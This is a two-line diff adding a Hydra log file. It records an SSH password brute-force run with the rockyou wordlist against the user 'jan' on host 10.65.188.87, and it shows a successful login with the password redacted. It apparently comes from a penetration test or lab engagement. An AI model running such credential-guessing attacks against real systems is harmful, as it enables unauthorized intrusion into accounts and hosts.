@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-10-06 17:35:18 on 10.65.188.87 ssh (hydra -l jan -P /tmp/rockyou.txt -t 4 -f -o bitacora/hydra_jan.txt ssh://10.65.188.87)
+[22][ssh] host: 10.65.188.87   login: jan   password: [REDACTED]
